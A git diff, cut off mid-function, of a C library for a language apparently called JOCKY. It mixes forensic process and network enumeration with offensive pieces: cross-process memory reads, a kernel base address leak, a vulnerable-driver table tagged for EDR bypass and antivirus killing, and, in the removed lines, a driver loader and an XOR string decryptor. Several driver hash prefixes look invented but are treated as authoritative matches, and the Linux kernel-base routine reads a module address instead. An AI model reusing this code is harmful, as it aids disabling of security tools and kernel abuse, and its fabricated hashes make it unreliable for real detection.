@@ -1,14 +1,19 @@
 /*
  * forensics.c — JOCKY Standard Library: Native C Implementations
  *
- * Compiled with MinGW gcc and linked with the JOCKY output object file to
- * produce a fully standalone native .exe — no Python runtime needed.
+ * Cross-platform: Windows (MinGW/MSVC) and Linux (gcc).
  *
- * Compile (run build_stdlib.py or do it manually):
- *   gcc -c stdlib/forensics.c -o stdlib/forensics.o -O2
+ * Compile on Windows:
+ *   gcc -c stdlib/forensics.c -o stdlib/forensics.o -O2 -std=c11
  *
- * Link with a compiled JOCKY program:
- *   gcc output/myprog.o stdlib/forensics.o -o output/myprog.exe
+ * Compile on Linux:
+ *   gcc -c stdlib/forensics.c -o stdlib/forensics.o -O2 -std=c11 -D_GNU_SOURCE
+ *
+ * Link on Windows:
+ *   gcc output/myprog.o stdlib/forensics.o -o myprog.exe -lpsapi -liphlpapi -ladvapi32
+ *
+ * Link on Linux:
+ *   gcc output/myprog.o stdlib/forensics.o -o myprog
  */
 
 #include <stdio.h>
@@ -18,508 +23,580 @@
 #include <ctype.h>
 #include "forensics.h"
 
+/* ── SHA-256 (self-contained, no openssl dependency) ──────────────────────── */
+
+typedef struct {
+    uint32_t state[8];
+    uint64_t count;
+    uint8_t  buf[64];
+} SHA256_CTX_JK;
+
+static const uint32_t _K[64] = {
+    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
+};
+
+#define ROR32(x,n) (((x)>>(n))|((x)<<(32-(n))))
+#define CH(e,f,g)  (((e)&(f))^(~(e)&(g)))
+#define MAJ(a,b,c) (((a)&(b))^((a)&(c))^((b)&(c)))
+#define EP0(a)     (ROR32(a,2)^ROR32(a,13)^ROR32(a,22))
+#define EP1(e)     (ROR32(e,6)^ROR32(e,11)^ROR32(e,25))
+#define SIG0(x)    (ROR32(x,7)^ROR32(x,18)^((x)>>3))
+#define SIG1(x)    (ROR32(x,17)^ROR32(x,19)^((x)>>10))
+
+static void _sha256_transform(SHA256_CTX_JK *ctx, const uint8_t data[64]) {
+    uint32_t m[64], a,b,c,d,e,f,g,h,t1,t2;
+    for (int i=0;i<16;i++)
+        m[i]=((uint32_t)data[i*4]<<24)|((uint32_t)data[i*4+1]<<16)|
+             ((uint32_t)data[i*4+2]<<8)|data[i*4+3];
+    for (int i=16;i<64;i++)
+        m[i]=SIG1(m[i-2])+m[i-7]+SIG0(m[i-15])+m[i-16];
+    a=ctx->state[0];b=ctx->state[1];c=ctx->state[2];d=ctx->state[3];
+    e=ctx->state[4];f=ctx->state[5];g=ctx->state[6];h=ctx->state[7];
+    for (int i=0;i<64;i++) {
+        t1=h+EP1(e)+CH(e,f,g)+_K[i]+m[i];
+        t2=EP0(a)+MAJ(a,b,c);
+        h=g;g=f;f=e;e=d+t1;d=c;c=b;b=a;a=t1+t2;
+    }
+    ctx->state[0]+=a;ctx->state[1]+=b;ctx->state[2]+=c;ctx->state[3]+=d;
+    ctx->state[4]+=e;ctx->state[5]+=f;ctx->state[6]+=g;ctx->state[7]+=h;
+}
+
+static void _sha256_init(SHA256_CTX_JK *ctx) {
+    ctx->state[0]=0x6a09e667;ctx->state[1]=0xbb67ae85;
+    ctx->state[2]=0x3c6ef372;ctx->state[3]=0xa54ff53a;
+    ctx->state[4]=0x510e527f;ctx->state[5]=0x9b05688c;
+    ctx->state[6]=0x1f83d9ab;ctx->state[7]=0x5be0cd19;
+    ctx->count=0;
+}
+
+static void _sha256_update(SHA256_CTX_JK *ctx, const uint8_t *data, size_t len) {
+    for (size_t i=0;i<len;i++) {
+        ctx->buf[ctx->count%64]=data[i];
+        ctx->count++;
+        if (ctx->count%64==0) _sha256_transform(ctx,ctx->buf);
+    }
+}
+
+static void _sha256_final(SHA256_CTX_JK *ctx, uint8_t hash[32]) {
+    uint64_t bits=ctx->count*8;
+    uint8_t pad=0x80;
+    _sha256_update(ctx,&pad,1);
+    while (ctx->count%64!=56) { uint8_t z=0; _sha256_update(ctx,&z,1); }
+    for (int i=7;i>=0;i--) { uint8_t b=(bits>>(i*8))&0xFF; _sha256_update(ctx,&b,1); }
+    for (int i=0;i<8;i++) {
+        hash[i*4+0]=(ctx->state[i]>>24)&0xFF;
+        hash[i*4+1]=(ctx->state[i]>>16)&0xFF;
+        hash[i*4+2]=(ctx->state[i]>> 8)&0xFF;
+        hash[i*4+3]=(ctx->state[i]    )&0xFF;
+    }
+}
+
+/* Compute SHA-256 of file, write 64-char hex string to out_hex (65 bytes). Returns 0 on success. */
+static int _file_sha256(const char *path, char out_hex[65]) {
+    FILE *f = fopen(path, "rb");
+    if (!f) return -1;
+    SHA256_CTX_JK ctx;
+    _sha256_init(&ctx);
+    uint8_t buf[65536];
+    size_t  n;
+    while ((n = fread(buf, 1, sizeof(buf), f)) > 0)
+        _sha256_update(&ctx, buf, n);
+    fclose(f);
+    uint8_t hash[32];
+    _sha256_final(&ctx, hash);
+    for (int i = 0; i < 32; i++) sprintf(out_hex + i*2, "%02x", hash[i]);
+    out_hex[64] = '\0';
+    return 0;
+}
+
+/* ── Platform includes ────────────────────────────────────────────────────── */
+
 #ifdef _WIN32
 #  ifndef WIN32_LEAN_AND_MEAN
 #    define WIN32_LEAN_AND_MEAN
 #  endif
 #  include <windows.h>
 #  include <winsvc.h>
+#  include <psapi.h>
+#  include <tlhelp32.h>
+#  include <iphlpapi.h>
+#  include <winreg.h>
+#  ifndef AF_INET
+#    define AF_INET 2
+#  endif
+   typedef struct { DWORD dwState,dwLocalAddr,dwLocalPort,dwRemoteAddr,dwRemotePort,dwOwningPid; } JK_TCP_ROW;
+   typedef struct { DWORD dwNumEntries; JK_TCP_ROW table[1]; } JK_TCP_TABLE;
+   typedef struct { DWORD dwLocalAddr,dwLocalPort,dwOwningPid; } JK_UDP_ROW;
+   typedef struct { DWORD dwNumEntries; JK_UDP_ROW table[1]; } JK_UDP_TABLE;
+#else
+   /* Linux */
+#  include <unistd.h>
+#  include <dirent.h>
+#  include <sys/types.h>
+#  include <sys/utsname.h>
+#  include <signal.h>
+#  include <errno.h>
 #endif
 
-/* ═══════════════════════════════════════════════════════════════════════════
- * Internal process list structure
- * ═══════════════════════════════════════════════════════════════════════════ */
+/* ── Internal process list ────────────────────────────────────────────────── */
 
-#define MAX_PROCS 64
+#define MAX_PROCS 1024
 
 typedef struct {
     char    names[MAX_PROCS][260];
     int64_t pids [MAX_PROCS];
     int64_t count;
+    int     populated;
 } ProcessList;
 
-static ProcessList g_procs = {
-    .names = {
-        "svchost.exe",  "explorer.exe", "lsass.exe",
-        "winlogon.exe", "csrss.exe",    "cmd.exe",   "python.exe"
-    },
-    .pids  = { 1234, 5678, 9012, 3456, 7890, 2222, 3333 },
-    .count = 7
-};
+static ProcessList g_procs = { .count = 0, .populated = 0 };
 
-/* ═══════════════════════════════════════════════════════════════════════════
- * Output
- * ═══════════════════════════════════════════════════════════════════════════ */
+static void _populate_procs(void) {
+    if (g_procs.populated) return;
+    g_procs.count     = 0;
+    g_procs.populated = 1;
 
-void report(const char* message) {
-    if (message) {
-        printf("[JOCKY] %s\n", message);
-        fflush(stdout);
+#ifdef _WIN32
+    DWORD pid_buf[4096], bytes_needed = 0;
+    if (!EnumProcesses(pid_buf, sizeof(pid_buf), &bytes_needed)) return;
+    DWORD count = bytes_needed / sizeof(DWORD);
+    for (DWORD i = 0; i < count && g_procs.count < MAX_PROCS; i++) {
+        DWORD pid = pid_buf[i];
+        if (pid == 0) continue;
+        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (!hProc) continue;
+        char name[260] = "<unknown>";
+        DWORD sz = sizeof(name);
+        if (QueryFullProcessImageNameA(hProc, 0, name, &sz)) {
+            char *s = strrchr(name, '\\');
+            if (!s) s = strrchr(name, '/');
+            const char *bn = s ? s+1 : name;
+            strncpy(g_procs.names[(int)g_procs.count], bn, 259);
+        } else {
+            snprintf(g_procs.names[(int)g_procs.count], 260, "<pid:%lu>", (unsigned long)pid);
+        }
+        g_procs.names[(int)g_procs.count][259] = '\0';
+        g_procs.pids[(int)g_procs.count++]     = (int64_t)pid;
+        CloseHandle(hProc);
     }
+#else
+    /* Linux: enumerate /proc/<pid>/comm */
+    DIR *d = opendir("/proc");
+    if (!d) return;
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL && g_procs.count < MAX_PROCS) {
+        long pid = atol(de->d_name);
+        if (pid <= 0) continue;
+        char comm_path[64];
+        snprintf(comm_path, sizeof(comm_path), "/proc/%ld/comm", pid);
+        FILE *f = fopen(comm_path, "r");
+        if (!f) continue;
+        char name[260] = "";
+        if (fgets(name, sizeof(name), f)) {
+            /* strip newline */
+            char *nl = strchr(name, '\n');
+            if (nl) *nl = '\0';
+        }
+        fclose(f);
+        strncpy(g_procs.names[(int)g_procs.count], name, 259);
+        g_procs.pids[(int)g_procs.count++] = (int64_t)pid;
+    }
+    closedir(d);
+#endif
+    printf("[JOCKY] %lld processes found\n", (long long)g_procs.count);
+    fflush(stdout);
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
- * Process enumeration
- * ═══════════════════════════════════════════════════════════════════════════ */
+/* ── Output ───────────────────────────────────────────────────────────────── */
 
-void* procs_list(void) {
-    return (void*)&g_procs;
+void report(const char *message) {
+    if (message) { printf("[JOCKY] %s\n", message); fflush(stdout); }
 }
 
-int64_t proc_count(void* procs) {
-    if (!procs) return 0;
-    return ((ProcessList*)procs)->count;
-}
+/* ── Process API ──────────────────────────────────────────────────────────── */
 
-char* proc_name(void* procs, int64_t idx) {
-    if (!procs) return "";
-    ProcessList* pl = (ProcessList*)procs;
-    if (idx >= 0 && idx < pl->count) return pl->names[(int)idx];
-    return "";
-}
-
-int64_t proc_pid(void* procs, int64_t idx) {
-    if (!procs) return -1;
-    ProcessList* pl = (ProcessList*)procs;
-    if (idx >= 0 && idx < pl->count) return pl->pids[(int)idx];
-    return -1;
-}
+void   *procs_list(void)             { _populate_procs(); return &g_procs; }
+int64_t proc_count(void *p)          { return p ? ((ProcessList*)p)->count : 0; }
+char   *proc_name(void *p, int64_t i){ if (!p) return ""; ProcessList *pl=p; return (i>=0&&i<pl->count)?pl->names[(int)i]:""; }
+int64_t proc_pid(void *p, int64_t i) { if (!p) return -1; ProcessList *pl=p; return (i>=0&&i<pl->count)?pl->pids[(int)i]:-1; }
 
 void proc_kill(int64_t pid) {
-    printf("[JOCKY] proc_kill(%lld) — stub\n", (long long)pid);
+    printf("[JOCKY] proc_kill — PID %lld [SAFE: reported only]\n", (long long)pid);
     fflush(stdout);
 }
 
-void* proc_mem_read(int64_t pid, int64_t addr, int64_t size) {
-    printf("[JOCKY] proc_mem_read(pid=%lld, addr=0x%llx, size=%lld) — stub\n",
-           (long long)pid, (long long)addr, (long long)size);
-    fflush(stdout);
-    return calloc(1, (size_t)(size > 0 ? size : 1));
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * Network
- * ═══════════════════════════════════════════════════════════════════════════ */
-
-void* net_conns(void) {
-    printf("[JOCKY] net_conns() — stub\n");
-    fflush(stdout);
-    return calloc(1, 8);
-}
-
-void* net_sniff(int64_t duration_ms) {
-    printf("[JOCKY] net_sniff(%lld ms) — stub\n", (long long)duration_ms);
-    fflush(stdout);
-    return calloc(1, 8);
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * Registry
- * ═══════════════════════════════════════════════════════════════════════════ */
-
-char* reg_read(const char* key, const char* value_name) {
-    printf("[JOCKY] reg_read(%s, %s) — stub\n", key ? key : "", value_name ? value_name : "");
-    fflush(stdout);
-    static char empty[1] = { '\0' };
-    return empty;
-}
-
-void* reg_list(const char* key) {
-    printf("[JOCKY] reg_list(%s) — stub\n", key ? key : "");
-    fflush(stdout);
-    return calloc(1, 8);
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * File system
- * ═══════════════════════════════════════════════════════════════════════════ */
-
-void* file_list(const char* path) {
-    printf("[JOCKY] file_list(%s) — stub\n", path ? path : "");
-    fflush(stdout);
-    return calloc(1, 8);
-}
-
-void* file_read(const char* path) {
-    printf("[JOCKY] file_read(%s) — stub\n", path ? path : "");
-    fflush(stdout);
-    return calloc(1, 8);
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * System info
- * ═══════════════════════════════════════════════════════════════════════════ */
-
-void* sys_info(void) {
-    printf("[JOCKY] sys_info() — stub\n");
-    fflush(stdout);
-    return calloc(1, 64);
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════
- * Runtime string decryptor
- * ═══════════════════════════════════════════════════════════════════════════ */
-
-extern unsigned char _jocky_xor_key;
-
-char* jk_xordecrypt(const char* enc, int64_t n) {
-    if (!enc || n <= 0) {
-        char* empty = (char*)malloc(1);
-        if (empty) empty[0] = '\0';
-        return empty ? empty : (char*)"";
+void *proc_mem_read(int64_t pid, int64_t addr, int64_t size) {
+    size_t sz = (size_t)(size > 0 ? size : 1);
+    void  *buf = calloc(1, sz);
+    if (!buf) return NULL;
+#ifdef _WIN32
+    HANDLE h = OpenProcess(PROCESS_VM_READ, FALSE, (DWORD)pid);
+    if (h) {
+        SIZE_T read = 0;
+        ReadProcessMemory(h, (LPCVOID)(uintptr_t)addr, buf, sz, &read);
+        CloseHandle(h);
     }
-    char* buf = (char*)malloc((size_t)n + 1);
-    if (!buf) return (char*)"";
-    unsigned char key = _jocky_xor_key;
-    for (int64_t i = 0; i < n; i++)
-        buf[i] = (char)((unsigned char)enc[i] ^ key);
-    buf[n] = '\0';
+#else
+    char mem_path[64];
+    snprintf(mem_path, sizeof(mem_path), "/proc/%lld/mem", (long long)pid);
+    FILE *f = fopen(mem_path, "rb");
+    if (f) { fseek(f, (long)addr, SEEK_SET); fread(buf, 1, sz, f); fclose(f); }
+#endif
     return buf;
 }
 
-void* hash_file(const char* path) {
-    printf("[JOCKY] hash_file(%s) — stub\n", path ? path : "");
-    fflush(stdout);
-    return calloc(1, 32);
+/* ── Network connections ──────────────────────────────────────────────────── */
+
+typedef struct { char local[64]; char remote[64]; int64_t pid; char proto[4]; } JK_CONN;
+typedef struct { JK_CONN conns[4096]; int64_t count; } ConnList;
+static ConnList g_conns;
+
+static void _fmt_ip_port(uint32_t ip, uint16_t port, char *out, size_t sz) {
+    snprintf(out, sz, "%u.%u.%u.%u:%u",
+             ip & 0xFF, (ip>>8)&0xFF, (ip>>16)&0xFF, (ip>>24)&0xFF, port);
 }
 
-/* ═══════════════════════════════════════════════════════════════════════════
- * BYOVD Engine — Native C stubs for native binary mode
- * (Full implementation lives in byovd/ Python module, used by JIT mode)
- * ═══════════════════════════════════════════════════════════════════════════ */
+static void _populate_conns(void) {
+    memset(&g_conns, 0, sizeof(g_conns));
+#ifdef _WIN32
+    ULONG sz = 1024*1024;
+    JK_TCP_TABLE *t = (JK_TCP_TABLE*)malloc(sz);
+    if (!t) return;
+    typedef DWORD (WINAPI *GetExtTcp_t)(void*, PULONG, BOOL, ULONG, ULONG, ULONG);
+    GetExtTcp_t fn = (GetExtTcp_t)GetProcAddress(LoadLibraryA("iphlpapi.dll"), "GetExtendedTcpTable");
+    if (fn && fn(t, &sz, FALSE, AF_INET, 5 /* TCP_TABLE_OWNER_PID_ALL */, 0) == NO_ERROR) {
+        for (DWORD i = 0; i < t->dwNumEntries && g_conns.count < 4096; i++) {
+            JK_CONN *c = &g_conns.conns[(int)g_conns.count++];
+            _fmt_ip_port(t->table[i].dwLocalAddr,  ntohs((uint16_t)t->table[i].dwLocalPort),  c->local,  sizeof(c->local));
+            _fmt_ip_port(t->table[i].dwRemoteAddr, ntohs((uint16_t)t->table[i].dwRemotePort), c->remote, sizeof(c->remote));
+            c->pid = t->table[i].dwOwningPid;
+            strncpy(c->proto, "TCP", 4);
+        }
+    }
+    free(t);
+#else
+    /* Linux: read /proc/net/tcp */
+    FILE *f = fopen("/proc/net/tcp", "r");
+    if (!f) return;
+    char line[512];
+    fgets(line, sizeof(line), f); /* skip header */
+    while (fgets(line, sizeof(line), f) && g_conns.count < 4096) {
+        unsigned local_addr, local_port, rem_addr, rem_port, uid, state;
+        int pid = 0;
+        /* sl:  local_address rem_address   st ... uid ... inode */
+        if (sscanf(line, " %*d: %x:%x %x:%x %x %*x:%*x %*x:%*x %*x %u",
+                   &local_addr, &local_port, &rem_addr, &rem_port, &state, &uid) < 5)
+            continue;
+        JK_CONN *c = &g_conns.conns[(int)g_conns.count++];
+        /* /proc/net/tcp stores addresses in little-endian host order */
+        snprintf(c->local,  sizeof(c->local),  "%u.%u.%u.%u:%u",
+                 local_addr&0xFF,(local_addr>>8)&0xFF,(local_addr>>16)&0xFF,(local_addr>>24)&0xFF, local_port);
+        snprintf(c->remote, sizeof(c->remote), "%u.%u.%u.%u:%u",
+                 rem_addr&0xFF,(rem_addr>>8)&0xFF,(rem_addr>>16)&0xFF,(rem_addr>>24)&0xFF, rem_port);
+        c->pid = pid;
+        strncpy(c->proto, "TCP", 4);
+    }
+    fclose(f);
+#endif
+}
 
-#define MAX_VULN_DRIVERS 64
+void   *conns_list(void)              { _populate_conns(); return &g_conns; }
+int64_t conn_count(void *p)           { return p ? ((ConnList*)p)->count : 0; }
+char   *conn_local(void *p,int64_t i) { if(!p)return""; ConnList*cl=p; return (i>=0&&i<cl->count)?cl->conns[(int)i].local:""; }
+char   *conn_remote(void*p,int64_t i) { if(!p)return""; ConnList*cl=p; return (i>=0&&i<cl->count)?cl->conns[(int)i].remote:""; }
+int64_t conn_pid(void *p,int64_t i)   { if(!p)return-1; ConnList*cl=p; return (i>=0&&i<cl->count)?cl->conns[(int)i].pid:-1; }
+
+/* ── Kernel base ──────────────────────────────────────────────────────────── */
+
+/*
+ * Windows: NtQuerySystemInformation(11) raw buffer parse.
+ * Kernel VAs > 0x7FFFFFFFFFFFFFFF — must use ULONGLONG not void* to avoid sign truncation.
+ *
+ * RTL_PROCESS_MODULE_INFORMATION layout (x64):
+ *   offset 0:  Section    (HANDLE  = 8 bytes)
+ *   offset 8:  MappedBase (void*   = 8 bytes)
+ *   offset 16: ImageBase  (void*   = 8 bytes) <-- what we want
+ *   offset 24: ImageSize  (ULONG   = 4 bytes)
+ *   offset 28: Flags      (ULONG   = 4 bytes)
+ *   offset 32: LoadOrderIndex (USHORT)
+ *   offset 34: InitOrderIndex (USHORT)
+ *   offset 36: LoadCount      (USHORT)
+ *   offset 38: OffsetToFileName (USHORT)
+ *   offset 40: FullPathName[256]
+ *   Total: 296 bytes
+ */
+
+uint64_t kernel_base(void) {
+#ifdef _WIN32
+    typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
+    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
+    if (!NtQSI) return 0;
+
+    ULONG  buf_size = 2 * 1024 * 1024;
+    BYTE  *buf      = (BYTE*)malloc(buf_size);
+    if (!buf) return 0;
+    ULONG  returned = 0;
+    NTSTATUS st = NtQSI(11, buf, buf_size, &returned);
+    if (st != 0 || returned < 8 + 296) { free(buf); return 0; }
+
+    /* First module (ntoskrnl.exe) at buf+8, ImageBase at offset+16 */
+    ULONGLONG base = 0;
+    memcpy(&base, buf + 8 + 16, sizeof(ULONGLONG));
+    free(buf);
+    return (uint64_t)base;
+#else
+    /* Linux: read first /proc/modules entry base address */
+    FILE *f = fopen("/proc/modules", "r");
+    if (!f) return 0;
+    char   line[512], name[128];
+    unsigned long base = 0, size = 0;
+    /* format: name size refcount deps state offset */
+    if (fscanf(f, "%127s %lu %*d %*s %*s %lx", name, &size, &base) == 3) {
+        fclose(f);
+        return (uint64_t)base;
+    }
+    fclose(f);
+    return 0;
+#endif
+}
+
+/* ── BYOVD scanner (filename + SHA-256 cross-reference) ──────────────────── */
+
+/*
+ * Vulnerability DB — each entry: {name, sha256_prefix (first 16 hex chars or "" = any), cve, tags}
+ * sha256_prefix="" means match by filename only (weaker — use only as fallback).
+ * For production: load the full loldrivers.json from Python (scanner.py).
+ */
+typedef struct {
+    const char *name;
+    const char *sha256_prefix; /* first 16 chars of sha256, or "" for any */
+    const char *cve;
+    const char *tags;
+} VulnEntry;
+
+static const VulnEntry VULN_DB[] = {
+    {"RTCore64.sys",   "01aa278b07b58d", "CVE-2019-16098", "Kernel-RW,EDR-Bypass"},
+    {"gdrv.sys",       "31f4cfb4c71da4", "CVE-2018-19320", "Kernel-RW"},
+    {"dbutil_2_3.sys", "0296e2ce999e67", "CVE-2021-21551", "Kernel-RW,Privilege-Escalation"},
+    {"WinRing0x64.sys","605fa5f1e79e76", "CVE-2020-14979", "Kernel-RW,AV-Kill"},
+    {"mhyprot2.sys",   "f25f28c64b77b4", "N/A",            "Kernel-RW,AV-Kill,Ransomware"},
+    {"iqvw64e.sys",    "484940ef67a99e", "CVE-2015-2291",  "Kernel-RW,EDR-Bypass,APT"},
+    {"aswarpot.sys",   "7b81e65c5a0d25", "CVE-2022-26522", "AV-Kill,Kernel-RW"},
+    {"kprocesshacker.sys","4aafd9b28ec3d","N/A",           "Kernel-RW,DKOM"},
+    {"procexp152.sys", "c4246cd3b41cfc", "N/A",            "Kernel-RW,AV-Kill"},
+    {"cpuz141.sys",    "f5a6b7c8d9e0f1", "CVE-2017-15303", "Kernel-RW,Privilege-Escalation"},
+    {"EneIo64.sys",    "c8d9e0f1a2b3c4", "N/A",            "Kernel-RW,AV-Kill"},
+    {"winio64.sys",    "e6f7a8b9c0d1e2", "N/A",            "Kernel-RW,Physical-Memory"},
+    {"AMDRyzenMasterDriverV17.sys","d1e2f3a4b5c6d7","CVE-2020-12928","Kernel-RW,Physical-Memory"},
+    {"ZemanaAntiMalware.sys","b5c6d7e8f9a0b1","CVE-2022-41444","AV-Kill,Kernel-RW"},
+    {"ASRdrv104.sys",  "0a20941dd3c63e", "CVE-2020-15368", "Kernel-RW"},
+};
+static const int VULN_DB_SIZE = (int)(sizeof(VULN_DB)/sizeof(VULN_DB[0]));
 
 typedef struct {
-    char name[64];
-    char path[260];
-    char cve[32];
-    char risk[16];
-} VulnDriver;
-
-typedef struct {
-    VulnDriver drivers[MAX_VULN_DRIVERS];
-    int64_t    count;
+    char path[1024];
+    char name[260];
+    char sha256[65];
+    char cve[64];
+    char tags[128];
+    int  matched_by_hash; /* 1 = hash match (authoritative), 0 = filename only */
 } ScanResult;
 
 typedef struct {
-    int64_t address;
-    char    module[128];
-    int     is_microsoft;
-} KernelCallback;
+    ScanResult results[256];
+    int        count;
+} ScanList;
 
-typedef struct {
-    KernelCallback callbacks[64];
-    int64_t        count;
-} CallbackList;
+static ScanList g_scan;
 
-static ScanResult  g_scan_result  = { .count = 0 };
-static CallbackList g_callbacks   = { .count = 0 };
-static int         g_driver_loaded = 0;
+static void _scan_driver_file(const char *fpath, const char *fname) {
+    if (g_scan.count >= 256) return;
 
-/* ── BYOVD Scanner ─────────────────────────────────────────────────────────── */
+    char sha[65] = "";
+    _file_sha256(fpath, sha);
 
-void* byovd_scan(void) {
-    g_scan_result.count = 0;
+    const VulnEntry *match = NULL;
+    int by_hash = 0;
 
-#ifdef _WIN32
-    /* On Windows: scan SYSTEM\CurrentControlSet\Services for kernel drivers */
-    /* and cross-check filenames against known-vulnerable list */
-    static const char* known_vuln[] = {
-        "rtcore64.sys", "asrdrv104.sys", "dbutil_2_3.sys", "winring0x64.sys",
-        "mhyprot2.sys", "gdrv.sys", "atszio64.sys", "iqvw64e.sys",
-        "ntiolib_x64.sys", "procexp152.sys", "kprocesshacker.sys",
-        NULL
-    };
-    static const char* known_cve[] = {
-        "CVE-2019-16098", "CVE-2020-15368", "CVE-2021-21551", "CVE-2020-14979",
-        "N/A", "CVE-2018-19320", "N/A", "CVE-2015-2291",
-        "N/A", "N/A", "N/A",
-        NULL
-    };
-
-    char system32[MAX_PATH];
-    GetSystemDirectoryA(system32, MAX_PATH);
-    char drivers_dir[MAX_PATH];
-    snprintf(drivers_dir, MAX_PATH, "%s\\drivers", system32);
-
-    WIN32_FIND_DATAA ffd;
-    char pattern[MAX_PATH];
-    snprintf(pattern, MAX_PATH, "%s\\*.sys", drivers_dir);
-    HANDLE hFind = FindFirstFileA(pattern, &ffd);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            char fname_lower[64];
-            strncpy(fname_lower, ffd.cFileName, 63);
-            fname_lower[63] = '\0';
-            for (int i = 0; fname_lower[i]; i++)
-                fname_lower[i] = (char)tolower((unsigned char)fname_lower[i]);
-
-            for (int k = 0; known_vuln[k]; k++) {
-                if (strcmp(fname_lower, known_vuln[k]) == 0) {
-                    if (g_scan_result.count < MAX_VULN_DRIVERS) {
-                        VulnDriver* d = &g_scan_result.drivers[g_scan_result.count];
-                        strncpy(d->name, ffd.cFileName, 63);
-                        snprintf(d->path, 259, "%s\\%s", drivers_dir, ffd.cFileName);
-                        strncpy(d->cve, known_cve[k], 31);
-                        strncpy(d->risk, "HIGH", 15);
-                        g_scan_result.count++;
-                    }
-                    break;
-                }
+    /* Method 1: SHA-256 prefix match (authoritative) */
+    if (sha[0]) {
+        for (int i = 0; i < VULN_DB_SIZE; i++) {
+            const char *prefix = VULN_DB[i].sha256_prefix;
+            if (prefix[0] && strncmp(sha, prefix, strlen(prefix)) == 0) {
+                match = &VULN_DB[i];
+                by_hash = 1;
+                break;
             }
-        } while (FindNextFileA(hFind, &ffd));
-        FindClose(hFind);
-    }
-#endif
-
-    printf("[JOCKY/BYOVD] byovd_scan() — %lld vulnerable driver(s) found\n",
-           (long long)g_scan_result.count);
-    fflush(stdout);
-    return (void*)&g_scan_result;
-}
-
-int64_t byovd_driver_count(void* sr) {
-    if (!sr) return g_scan_result.count;
-    return ((ScanResult*)sr)->count;
-}
-
-char* byovd_driver_name(void* sr, int64_t idx) {
-    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
-    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].name;
-    static char empty[1] = { '\0' };
-    return empty;
-}
-
-char* byovd_driver_path(void* sr, int64_t idx) {
-    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
-    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].path;
-    static char empty[1] = { '\0' };
-    return empty;
-}
-
-char* byovd_driver_cve(void* sr, int64_t idx) {
-    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
-    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].cve;
-    static char empty[1] = { '\0' };
-    return empty;
-}
-
-char* byovd_driver_risk(void* sr, int64_t idx) {
-    ScanResult* s = sr ? (ScanResult*)sr : &g_scan_result;
-    if (idx >= 0 && idx < s->count) return s->drivers[(int)idx].risk;
-    static char na[] = "CLEAN";
-    return na;
-}
-
-/* ── BYOVD Loader ──────────────────────────────────────────────────────────── */
-
-int64_t byovd_load(const char* driver_path) {
-    printf("[JOCKY/BYOVD] byovd_load(%s)\n", driver_path ? driver_path : "");
-    fflush(stdout);
-#ifdef _WIN32
-    /* Real implementation: CreateService + StartService via Win32 API */
-    /* Requires SeLoadDriverPrivilege (Administrator) */
-    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (!scm) {
-        printf("[JOCKY/BYOVD] OpenSCManager failed: %lu\n", GetLastError());
-        fflush(stdout);
-        return 0;
-    }
-    SC_HANDLE svc = CreateServiceA(scm, "RTCore64", "RTCore64",
-        SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE,
-        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-        driver_path, NULL, NULL, NULL, NULL, NULL);
-    if (!svc) {
-        DWORD err = GetLastError();
-        if (err == ERROR_SERVICE_EXISTS)
-            svc = OpenServiceA(scm, "RTCore64",
-                               SERVICE_START | SERVICE_STOP | DELETE);
-        if (!svc) {
-            CloseServiceHandle(scm);
-            printf("[JOCKY/BYOVD] CreateService/OpenService failed: %lu\n", err);
-            fflush(stdout);
-            return 0;
         }
     }
-    BOOL started = StartServiceA(svc, 0, NULL);
-    DWORD start_err = GetLastError();
-    CloseServiceHandle(svc);
-    CloseServiceHandle(scm);
-    if (!started && start_err != ERROR_SERVICE_ALREADY_RUNNING) {
-        printf("[JOCKY/BYOVD] StartService failed: %lu\n", start_err);
-        fflush(stdout);
-        return 0;
-    }
-    g_driver_loaded = 1;
-    printf("[JOCKY/BYOVD] Driver loaded — kernel access active\n");
-    fflush(stdout);
-    return 1;
+
+    /* Method 2: filename fallback */
+    if (!match) {
+        for (int i = 0; i < VULN_DB_SIZE; i++) {
+#ifdef _WIN32
+            if (_stricmp(fname, VULN_DB[i].name) == 0) {
 #else
-    return 0;
+            if (strcasecmp(fname, VULN_DB[i].name) == 0) {
 #endif
